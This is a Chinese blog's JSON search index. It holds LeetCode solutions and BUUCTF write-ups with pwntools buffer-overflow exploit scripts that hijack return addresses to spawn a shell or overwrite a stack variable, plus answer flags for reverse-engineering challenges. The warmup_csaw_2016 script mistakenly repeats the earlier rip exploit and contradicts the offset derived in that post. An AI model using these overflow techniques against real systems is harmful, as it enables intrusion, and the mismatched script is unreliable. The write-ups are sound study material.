[&#x27;&#x27;] * numRows        cur_row = 0       # 当前行        going_down = False  # 是否向下移动        # 逐个字符放入对应的行        for c in s:            rows[cur_row] += c            # 到达第一行或最后一行时，改变方向            if cur_row == 0 or cur_row == numRows - 1:                going_down = not going_down            # 根据方向移动行索引            cur_row += 1 if going_down else -1        # 拼接所有行并返回        return &#x27;&#x27;.join(rows)\n\n","categories":["编程","LeetCode","算法"],"tags":["编程","算法","力扣","LeetCode"]},{"title":"【LeetCode】力扣刷题记录-整数反转","url":"/posts/e078/","content":"给你一个 32 位的有符号整数 x ，返回将 x 中的数字部分反转后的结果。\n如果反转后整数超过 32 位的有符号整数的范围 [−231, 231 − 1] ，就返回 0。\n假设环境不允许存储 64 位整数（有符号或无符号）。\n示例 1：\n输入：x = 123输出：321\n示例 2：\n输入：x = -123输出：-321\n示例 3：\n输入：x = 120输出：21\n示例 4：\n输入：x = 0输出：0\n提示：\n\n-231 &lt;= x &lt;= 231 - 1\n\n有人跟我说，你直接用[::-1]不就好了？但是我们想想，如果x = -123,[::-1]的结果是什么？是不是321-?，那么如果是1230，是不是变成了0123？\n所以…\nclass Solution:    def reverse(self, x: int) -&gt; int:        # 处理符号，记录是否为负数        sign = -1 if x &lt; 0 else 1                # 转为正数处理        x = abs(x)                # 反转数字        result = 0        while x != 0:            # 取出最后一位数字            digit = x % 10            # 去掉最后一位数字            x //= 10            # 构建反转后的数字            result = result * 10 + digit                # 应用符号        result *= sign                # 检查是否超出32位整数范围        INT_MAX = 2**31 - 1        INT_MIN = -2**31                if result &gt; INT_MAX or result &lt; INT_MIN:            return 0                return result\n\n","categories":["编程","LeetCode","算法"],"tags":["编程","算法","力扣","LeetCode"]},{"title":"【LeetCode】力扣刷题记录-字符串转换整数 (atoi)","url":"/posts/11b9/","content":"请你来实现一个 myAtoi(string s) 函数，使其能将字符串转换成一个 32 位有符号整数。\n函数 myAtoi(string s) 的算法如下：\n\n空格： 读入字符串并丢弃无用的前导空格（&quot; &quot;）\n符号： 检查下一个字符（假设还未到字符末尾）为 &#39;-&#39; 还是 &#39;+&#39;。如果两者都不存在，则假定结果为正。\n转换： 通过跳过前置零来读取该整数，直到遇到非数字字符或到达字符串的结尾。如果没有读取数字，则结果为0。\n舍入： 如果整数数超过 32 位有符号整数范围 [−231, 231 − 1] ，需要截断这个整数，使其保持在这个范围内。具体来说，小于 −231 的整数应该被舍入为 −231 ，大于 231 − 1 的整数应该被舍入为 231 − 1 。\n\n返回整数作为最终结果。\n示例 1：\n输入： s = “42”\n输出： 42\n解释：加粗的字符串为已经读入的字符，插入符号是当前读取的字符。\n带下划线线的字符是所读的内容，插入符号是当前读入位置。第 1 步：&quot;42&quot;（当前没有读入字符，因为没有前导空格）         ^第 2 步：&quot;42&quot;（当前没有读入字符，因为这里不存在 &#x27;-&#x27; 或者 &#x27;+&#x27;）         ^第 3 步：&quot;42&quot;（读入 &quot;42&quot;）           ^\n示例 2：\n输入： s = “ -042”\n输出：-42\n解释：\n第 1 步：&quot;   -042&quot;（读入前导空格，但忽视掉）            ^第 2 步：&quot;   -042&quot;（读入 &#x27;-&#x27; 字符，所以结果应该是负数）             ^第 3 步：&quot;   -042&quot;（读入 &quot;042&quot;，在结果中忽略前导零）               ^\n示例 3：\n输入： s = “1337c0d3”\n输出： 1337\n解释：\n第 1 步：&quot;1337c0d3&quot;（当前没有读入字符，因为没有前导空格）         ^第 2 步：&quot;1337c0d3&quot;（当前没有读入字符，因为这里不存在 &#x27;-&#x27; 或者 &#x27;+&#x27;）         ^第 3 步：&quot;1337c0d3&quot;（读入 &quot;1337&quot;；由于下一个字符不是一个数字，所以读入停止）             ^\n示例 4：\n输入： s = “0-1”\n输出： 0\n解释：\n第 1 步：&quot;0-1&quot; (当前没有读入字符，因为没有前导空格)         ^第 2 步：&quot;0-1&quot; (当前没有读入字符，因为这里不存在 &#x27;-&#x27; 或者 &#x27;+&#x27;)         ^第 3 步：&quot;0-1&quot; (读入 &quot;0&quot;；由于下一个字符不是一个数字，所以读入停止)          ^\n示例 5：\n输入： s = “words and 987”\n输出： 0\n解释：\n读取在第一个非数字字符“w”处停止。\n提示：\n\n0 &lt;= s.length &lt;= 200\ns 由英文字母（大写和小写）、数字（0-9）、&#39; &#39;、&#39;+&#39;、&#39;-&#39; 和 &#39;.&#39; 组成\n\nclass Solution:    def myAtoi(self, s: str) -&gt; int:        # 去除前导空格        i = 0        while i &lt; len(s) and s[i] == &#x27; &#x27;:            i += 1                # 如果字符串全是空格，返回0        if i == len(s):            return 0                # 检查符号        sign = 1        if s[i] == &#x27;+&#x27;:            sign = 1            i += 1        elif s[i] == &#x27;-&#x27;:            sign = -1            i += 1                # 读取数字部分        result = 0        while i &lt; len(s) and s[i].isdigit():            digit = int(s[i])                        # 检查是否会溢出            # 在添加新数字前先检查是否会溢出            if result &gt; (2**31 - 1 - digit) // 10:                # 溢出处理                if sign == 1:                    return 2**31 - 1  # 2147483647                else:                    return -2**31     # -2147483648                        result = result * 10 + digit            i += 1                # 应用符号        result *= sign                # 检查是否在32位有符号整数范围内        INT_MAX = 2**31 - 1        INT_MIN = -2**31                if result &gt; INT_MAX:            return INT_MAX        if result &lt; INT_MIN:            return INT_MIN                return result\n\n","categories":["编程","LeetCode","算法"],"tags":["编程","算法","力扣","LeetCode"]},{"title":"【LeetCode】力扣刷题记录-回文数","url":"/posts/dbbd/","content":"给你一个整数 x ，如果 x 是一个回文整数，返回 true ；否则，返回 false 。\n回文数是指正序（从左向右）和倒序（从右向左）读都是一样的整数。\n\n例如，121 是回文，而 123 不是。\n\n示例 1：\n输入：x = 121输出：true\n示例 2：\n输入：x = -121输出：false解释：从左向右读, 为 -121 。 从右向左读, 为 121- 。因此它不是一个回文数。\n示例 3：\n输入：x = 10输出：false解释：从右向左读, 为 01 。因此它不是一个回文数。\n提示：\n\n-231 &lt;= x &lt;= 231 - 1\n\n进阶：你能不将整数转为字符串来解决这个问题吗？\nclass Solution:    def isPalindrome(self, x: int) -&gt; bool:        # 负数不是回文数        if x &lt; 0:            return False                # 单个数字是回文数        if x &lt; 10:            return True                # 计算x的反转数        original = x        reversed_num = 0                while x &gt; 0:            digit = x % 10            reversed_num = reversed_num * 10 + digit            x //= 10                # 比较原始数字和反转后的数字        return original == reversed_num\n\nclass Solution:    def isPalindrome(self, x: int) -&gt; bool:        # 负数一定不是回文数（因为会出现 &#x27;-&#x27;）        if x &lt; 0:            return False        # 转字符串反转比较        return str(x) == str(x)[::-1]\n\nclass Solution:    def isPalindrome(self, x: int) -&gt; bool:        if x &lt; 0 or (x % 10 == 0 and x != 0):            return False        reversed_half = 0        while x &gt; reversed_half:            reversed_half = reversed_half * 10 + x % 10            x //= 10        # 当长度为奇数时，reversed_half // 10 去掉中间数字        return x == reversed_half or x == reversed_half // 10\n\n","categories":["编程","LeetCode","算法"],"tags":["编程","算法","力扣","LeetCode"]},{"title":"【LeetCode】力扣刷题记录-正则表达式匹配","url":"/posts/4382/","content":"给你一个字符串 s 和一个字符规律 p，请你来实现一个支持 &#39;.&#39; 和 &#39;*&#39; 的正则表达式匹配。\n\n&#39;.&#39; 匹配任意单个字符\n&#39;*&#39; 匹配零个或多个前面的那一个元素\n\n所谓匹配，是要涵盖 整个 字符串 s 的，而不是部分字符串。\n示例 1：\n输入：s = &quot;aa&quot;, p = &quot;a&quot;输出：false解释：&quot;a&quot; 无法匹配 &quot;aa&quot; 整个字符串。\n示例 2:\n输入：s = &quot;aa&quot;, p = &quot;a*&quot;输出：true解释：因为 &#x27;*&#x27; 代表可以匹配零个或多个前面的那一个元素, 在这里前面的元素就是 &#x27;a&#x27;。因此，字符串 &quot;aa&quot; 可被视为 &#x27;a&#x27; 重复了一次。\n示例 3：\n输入：s = &quot;ab&quot;, p = &quot;.*&quot;输出：true解释：&quot;.*&quot; 表示可匹配零个或多个（&#x27;*&#x27;）任意字符（&#x27;.&#x27;）。\n提示：\n\n1 &lt;= s.length &lt;= 20\n1 &lt;= p.length &lt;= 20\ns 只包含从 a-z 的小写字母。\np 只包含从 a-z 的小写字母，以及字符 . 和 *。\n保证每次出现字符 * 时，前面都匹配到有效的字符\n\nclass Solution:    def isMatch(self, s: str, p: str) -&gt; bool:        m, n = len(s), len(p)        dp = [[False] * (n + 1) for _ in range(m + 1)]        dp[0][0] = True        # 初始化：空字符串匹配 p 的前缀        for j in range(2, n + 1):            if p[j - 1] == &#x27;*&#x27;:                dp[0][j] = dp[0][j - 2]        # 状态转移        for i in range(1, m + 1):            for j in range(1, n + 1):                if p[j - 1] == &#x27;.&#x27; or p[j - 1] == s[i - 1]:                    dp[i][j] = dp[i - 1][j - 1]                elif p[j - 1] == &#x27;*&#x27;:                    dp[i][j] = dp[i][j - 2]  # 匹配0次                    if p[j - 2] == s[i - 1] or p[j - 2] == &#x27;.&#x27;:                        dp[i][j] |= dp[i - 1][j]        return dp[m][n]\n\nclass Solution:    def isMatch(self, s: str, p: str) -&gt; bool:        m, n = len(s), len(p)        # dp[i][j] 表示 s[0:i] 与 p[0:j] 是否匹配        dp = [[False] * (n + 1) for _ in range(m + 1)]                # 空字符串与空模式匹配        dp[0][0] = True                # 处理 s 为空字符串的情况        # 只有当 p 中的字符都是 &quot;x*&quot; 形式时才能匹配空字符串        for j in range(2, n + 1):            if p[j - 1] == &#x27;*&#x27;:                dp[0][j] = dp[0][j - 2]                # 填充 dp 表        for i in range(1, m + 1):            for j in range(1, n + 1):                if p[j - 1] == &#x27;*&#x27;:                    # p[j-1] 是 &#x27;*&#x27;                    # 情况1: &#x27;*&#x27; 匹配0个前面的字符，即 dp[i][j-2]                    # 情况2: &#x27;*&#x27; 匹配1个或多个前面的字符，需要 s[i-1] 与 p[j-2] 匹配，然后看 dp[i-1][j]                    dp[i][j] = dp[i][j - 2]  # 匹配0个                    if p[j - 2] == &#x27;.&#x27; or p[j - 2] == s[i - 1]:                        dp[i][j] = dp[i][j] or dp[i - 1][j]  # 匹配1个或多个                else:                    # p[j-1] 不是 &#x27;*&#x27;                    # 当前字符匹配且前面部分也匹配                    if p[j - 1] == &#x27;.&#x27; or p[j - 1] == s[i - 1]:                        dp[i][j] = dp[i - 1][j - 1]                return dp[m][n]\n\n","categories":["编程","LeetCode","算法"],"tags":["编程","算法","力扣","LeetCode"]},{"title":"【BUUCTF】PWN-刷题记录-test_your_nc","url":"/posts/579e/","content":"题目信息\n解题步骤\nnc 连接后，可以直接执行命令，在此我们执行ls后看到了flag文件\ncat flag 即可获得flag\n\n","categories":["网络安全","CTF","BUUCTF","PWN"],"tags":["BUUCTF","PWN"]},{"title":"【BUUCTF】PWN-刷题记录-rip","url":"/posts/3ada/","content":"题目信息\n解题步骤\n程序是amd64、小端程序，GOT表在运行时仍然可写，存在GOT覆盖风险，没有栈保护,栈可执行、程序基地址固定\n使用ida进行分析：\n\n上述代码中，我们注意：\nchar s[15]; // [rsp+1h] [rbp-Fh]gets(s, argv);\n\ns 数组大小为 15 字节，位于栈上。\n使用了 危险函数 gets()：它会无限读取输入直到换行，完全不检查缓冲区边界。\n\ngets(s) 会把你输入的所有字节写到栈上：先写入 s（15字节），接着覆盖 saved rbp（8字节），再覆盖 return address（8字节），后面跟着你继续写的字节都会保存在 return address 之后的栈上（函数返回时 ret 从栈上弹出的就是我们写入的返回地址）。\n\ns 距离 rbp 仅 0xF = 15 字节，而 rbp 上方 8 字节是 返回地址（return address）。\n因此，输入超过 15 + 8 = 23 字节 即可覆盖返回地址。\n\n\n程序还有一个fun函数，调用了system函数，地址为0x401186\n程序的system函数，地址为0x404058\n\n这道题基本是典型的ret2fun，我们可以覆盖返回地址，让程序执行 fun() 函数（地址 0x401186）\n\n输入 23 字节填充（覆盖到返回地址）\n写入 fun 函数地址（小端序）：p64(0x401186)\n发送 payload，触发溢出，ret 跳转到 fun，执行 /bin/sh\n\nfrom pwn import *# context.log_level = &#x27;debug&#x27;p = process(&#x27;./rip&#x27;)elf = ELF(&#x27;./rip&#x27;)# fun 函数地址fun_addr = 0x401186 +1# 构造 payloadpayload = b&#x27;A&#x27; * 23          # 填充到返回地址payload += p64(fun_addr)     # 覆盖返回地址为 fun 函数地址# 发送输入p.sendline(payload)# 切换到交互模式p.interactive()\n\n那么大家发现了一个问题吗？为什么我在fun地址后+1了？fun_addr = 0x401186 +1\n; Attributes: bp-based frame; int fun()public funfun proc near; __unwind &#123;push    rbpmov     rbp, rsplea     rdi, command    ; &quot;/bin/sh&quot;call    _systemnoppop     rbpretn; &#125; // starts at 401186fun endp\n0x401186: push rbp0x401187: mov  rbp, rsp0x40118a: lea  rdi, [command]   ; &quot;/bin/sh&quot;0x401191: call _system0x401196: nop0x401197: pop  rbp0x401198: retn\n\n0x401186 的第一条指令是 push rbp（opcode 0x55）。fun + 1 即 0x401187 刚好是下一条指令 mov rbp, rsp 的起始字节（opcode 0x48）。\n如果把返回地址覆盖成 0x401186（push rbp），当 CPU 执行到这里时会先执行 push rbp，也就是把当前 rbp 再次压入栈，rsp 会减 8。这会改变栈指针（和栈对齐），可能导致之后 call _system 时栈不满足 ABI 对 call 前对齐 的要求，从而在某些环境下造成 crash（尤其当 system 或 libc 内部对栈对齐敏感时）。\n如果你把返回地址改成 0x401187（mov rbp, rsp），你跳过了 push rbp，不会额外改变 rsp，因此更有可能维持或更接近你在 exploit 时期望的栈对齐状态，从而 更稳定地成功调用 system(&quot;/bin/sh&quot;)。\n\n有两点常被误解：\n\n“地址必须 16 字节对齐” —— 这是对函数调用的 ABI 要求（call 之前），但 CPU 本身并不强制指令地址按 16 字节对齐；x86 指令是可变长且可以从任何有效指令边界开始执行。\n\n“跳到奇数地址会异常” —— 只要你落在一个有效的指令起始字节（而不是指令中间导致非法解码），即可正常执行。0x401187 在这里是 mov rbp, rsp 的起始字节，是合法的入口点，所以可行。\n\n\nfun + 1 是一个常见且合理的技巧：它跳过 push rbp，避免多做一次 rsp -= 8，从而更容易满足 call _system 执行前的栈对齐要求，结果更稳定。\n\n\nfrom pwn import *# context.log_level = &#x27;debug&#x27;# p = process(&#x27;./rip&#x27;)p = remote(&quot;node5.buuoj.cn&quot;, 29689)elf = ELF(&#x27;./rip&#x27;)# fun 函数地址fun_addr = 0x401186 +1# 构造 payloadpayload = b&#x27;A&#x27; * 23          # 填充到返回地址payload += p64(fun_addr)     # 覆盖返回地址为 fun 函数地址# 发送输入p.sendline(payload)# 切换到交互模式p.interactive()\n\n\n","categories":["网络安全","CTF","BUUCTF","PWN"],"tags":["BUUCTF","PWN"]},{"title":"【BUUCTF】PWN-刷题记录-warmup_csaw_2016","url":"/posts/c47f/","content":"题目信息\n解题步骤\n和上一题基本一样\n\nint __fastcall main(int a1, char **a2, char **a3)&#123;  char s[64]; // [rsp+0h] [rbp-80h] BYREF  _BYTE v5[64]; // [rsp+40h] [rbp-40h] BYREF  write(1, &quot;-Warm Up-\\n&quot;, 0xAu);  write(1, &quot;WOW:&quot;, 4u);  sprintf(s, &quot;%p\\n&quot;, sub_40060D); // sub_40060D中，调用system cat了flag  write(1, s, 9u);  write(1, &quot;&gt;&quot;, 1u);  return gets(v5);&#125;\nint sub_40060D()&#123;  return system(&quot;cat flag.txt&quot;);&#125;\n\nv5 是输入缓冲区：gets(v5)，大小 64 字节。\nv5 距离 rbp 是 0x40 = 64 字节。\n返回地址在 rbp + 8。\n所以从 v5 到返回地址的距离是：0x40 + 8 = 72 字节。\n\n\nsprintf(s, &quot;%p\\n&quot;, sub_40060D); write(1, s, 9);\n这行代码会打印 sub_40060D 函数的地址！\n例如输出：WOW:0x40060d\n\n\n这意味着：我们知道了 sub_40060D 的地址，也就是 system(&quot;cat flag.txt&quot;) 的地址！\n\n由于程序没有开启 PIE（地址固定），且我们直接拿到了 sub_40060D 的地址，所以,我们可以直接跳转到 sub_40060D，执行 system(&quot;cat flag.txt&quot;)，直接读取 flag！\n我们只需要：\n\n接收程序输出，提取 sub_40060D 的地址。\n构造 payload：\n72 字节填充（覆盖到返回地址）\n覆盖返回地址为 sub_40060D 的地址\n\n\n发送 payload\n获取 flag\n\nfrom pwn import *# context.log_level = &#x27;debug&#x27;# p = process(&#x27;./rip&#x27;)p = remote(&quot;node5.buuoj.cn&quot;, 29689)elf = ELF(&#x27;./rip&#x27;)# fun 函数地址fun_addr = 0x401186 +1# 构造 payloadpayload = b&#x27;A&#x27; * 23          # 填充到返回地址payload += p64(fun_addr)     # 覆盖返回地址为 fun 函数地址# 发送输入p.sendline(payload)# 切换到交互模式p.interactive()\n\n","categories":["网络安全","CTF","BUUCTF","PWN"],"tags":["BUUCTF","PWN"]},{"title":"【BUUCTF】PWN-刷题记录-ciscn_2019_n_1","url":"/posts/2b33/","content":"题目信息\n解题步骤\n[*] &#x27;/home/kali/Desktop/buuctf/ciscn_2019_n_1&#x27;    Arch:       amd64-64-little      → 64位小端程序    RELRO:      Partial RELRO        → GOT表可写（可被劫持）    Stack:      No canary found      → 无栈保护，可溢出    NX:         NX enabled           → 栈不可执行（不能直接执行shellcode）    PIE:        No PIE (0x400000)    → 地址固定，无ASLR    Stripped:   No                   → 符号表未剥离，函数名可见\n用 IDA 打开二进制文件，main 函数非常简单：\n\n关键逻辑在 func()：\n\n\nv1[44]：输入缓冲区，位于 [rbp-0x30]\nv2：float 类型，位于 [rbp-0x4]，初始值 0.0\n使用 gets(v1) → 栈溢出漏洞\n条件：v2 == 11.28125 才能执行\nsystem(&quot;cat /flag&quot;)\n\n直觉告诉我：不能直接 ROP 到 system，因为 v2 必须等于 11.28125。\n但 v2 就在栈上，紧挨着 v1！\n栈布局:\n+------------------+| saved rbp        | &lt;- rbp+------------------+| return address   | &lt;- rbp + 8+------------------+| ...              |+------------------+| v2 (4 bytes)     | &lt;- [rbp-0x4]+------------------+| padding?         | &lt;- [rbp-0x5 ~ 0x2b] (可能填充)+------------------+| v1[44]           | &lt;- [rbp-0x30] ~ [rbp-0x1]+------------------+\n也就是说，v1 和 v2 之间有 0x30 - 0x4 = 0x2c = 44 字节，但 v1 是 44 字节，v2 在 [rbp-4]，所以：v1 的最后 4 字节可以直接覆盖 v2 的内存！\n浮点数陷阱：11.28125 的二进制表示\nv2 是 float，我们需要知道 11.28125 在内存中长什么样。\n用 Python 计算：\nimport struct# 将 float 转为 4 字节 IEEE 754f = 11.28125packed = struct.pack(&#x27;f&#x27;, f)  # 小端print(packed.hex())  # 输出：00803441\n\n所以 11.28125 的内存表示是：\\x00\\x80\\x34\\x41（小端）\n我们只需要在 v1 的最后 4 字节写入 \\x00\\x80\\x34\\x41，就能让 v2 == 11.28125\n从 v1[0] 到 return address 的距离：\n\nv1：44 字节（[rbp-0x30] ~ [rbp-0x1]）\nv2：4 字节（[rbp-0x4]）\nsaved rbp：8 字节（[rbp+0]）\n返回地址：[rbp+8]\n\n所以：\n\n从 v1[0] 到 saved rbp：44 + 4 = 48 字节\n到返回地址：48 + 8 = 56 字节\n\n填充 56 字节后，接下来 8 字节就是返回地址。\n目标：覆盖 v2 为 11.28125，并跳转到 system(&quot;cat /flag&quot;)\n但 system(&quot;cat /flag&quot;) 已经在程序里了！我们只需要让函数正常返回，条件满足就会自动执行。\n所以 payload 只需要：\n\n前 44 字节：任意填充\n接下来 4 字节：覆盖 v2 为 11.28125 的二进制\n8 字节：覆盖 saved rbp（可任意）\n8 字节：覆盖返回地址为 func 函数末尾，让 if 条件成立后继续执行\n\n但更简单的方式是：让函数返回后，直接跳回 func 中 if 之后的代码。\n然而，最直接的方式是：不改变控制流，只让 v2 被覆盖，然后函数自然执行 system\n但 gets 后函数就结束了，我们无法控制 return 到哪。\n等等——我们不需要 ROP！\n只要 v2 被覆盖为 11.28125，gets 返回后，if 条件成立，直接执行 system(&quot;cat /flag&quot;)！\n所以：\n\n 我们甚至不需要控制返回地址！只需要在 v1 的最后 4 字节写入 11.28125 的二进制即可！\n\n但 gets 会读取到 \\x00 吗？\n会！gets 读取直到 \\n，不会在 \\x00 停止。\nfrom pwn import *p = process(&#x27;./ciscn_2019_n_1&#x27;)# p = remote(&#x27;node5.buuoj.cn&#x27;, 25195)# 计算 11.28125 的 float 表示v2_value = struct.pack(&#x27;f&#x27;, 11.28125)  # b&#x27;\\x00\\x804A&#x27;# 构造 payloadpayload = b&#x27;A&#x27; * 44        # 填充 v1payload += v2_value        # 覆盖 v2p.sendline(payload)# 或者直接交互p.interactive()  # 应该能收到 flag\n\nfrom pwn import *# p = process(&#x27;./ciscn_2019_n_1&#x27;)p = remote(&#x27;node5.buuoj.cn&#x27;, 25195)# 计算 11.28125 的 float 表示v2_value = struct.pack(&#x27;f&#x27;, 11.28125)  # b&#x27;\\x00\\x804A&#x27;# 构造 payloadpayload = b&#x27;A&#x27; * 44        # 填充 v1payload += v2_value        # 覆盖 v2p.sendline(payload)# 或者直接交互p.interactive()  # 应该能收到 flag\n\n","categories":["网络安全","CTF","BUUCTF","PWN"],"tags":["BUUCTF","PWN"]},{"title":"【BUUCTF】REVERSE-刷题记录-easyre","url":"/posts/6623/","content":"题目信息\n解题步骤先用DIE分析，发现是64位C程序\n\n使用IDA分析：\n\n也就是输入两个相同字符，就可以拿到flag\nflag&#123;this_Is_a_EaSyRe&#125;\n","categories":["网络安全","CTF","BUUCTF","REVERSE"],"tags":["BUUCTF","REVERSE"]},{"title":"【BUUCTF】REVERSE-刷题记录-reverse1","url":"/posts/e746/","content":"题目信息\n解题步骤\n编译器为 MSVC 19.00，对应 Visual Studio 2015 或 2017 版本。\n使用ida查看：\n\nfor ( j = 0; ; ++j )&#123;  v10 = j;  if ( j &gt; j_strlen(Str2) )    break;  if ( Str2[j] == 111 )    Str2[j] = 48;&#125;\n\nStr2 是一个字符串（全局变量或常量）\n遍历 Str2，把所有字符 &#39;o&#39;（ASCII 111）替换成 &#39;0&#39;（ASCII 48）\n条件是 j &gt; j_strlen(Str2) 才跳出 → 实际是 j &lt;= len 时继续\n所以这是一个 字符串预处理：将 Str2 中的 o → 0\n\n\n Str2 是“正确 flag”的模板，但被混淆了（用 o 代替 0）\n\nsub_1400111D1(&quot;input the flag:&quot;);sub_14001128F(&quot;%20s&quot;, Str1);\n\nsub_1400111D1：puts 或 printf 的封装（输出）\nsub_14001128F：scanf 的封装（输入）\n%20s：读取最多 20 个字符到 Str1\n所以用户输入被限制为 最多 20 字符的字符串\n\nv5 = j_strlen(Str2);if ( !strncmp(Str1, Str2, v5) )  sub_1400111D1(&quot;this is the right flag!\\n&quot;);else  sub_1400111D1(&quot;wrong flag\\n&quot;);\n\nj_strlen(Str2)：获取 Str2 的长度\nstrncmp(Str1, Str2, v5)：比较用户输入 Str1 和处理后的 Str2\n如果相等 → 输出 “right flag”\n\n所以我们要查看str2\n\n根据代码\nfor ( j = 0; ; ++j )&#123;    v10 = j;    if ( j &gt; j_strlen(Str2) )        break;    if ( Str2[j] == 111 )      // 111 是字符 &#x27;o&#x27; 的 ASCII 码        Str2[j] = 48;          // 48 是字符 &#x27;0&#x27; 的 ASCII 码&#125;\n进行变换，得到{hell0_w0rld}\n当然，也可以打个断点进行调试，直接看内容：\n\n\n","categories":["网络安全","CTF","BUUCTF","REVERSE"],"tags":["BUUCTF","REVERSE"]}]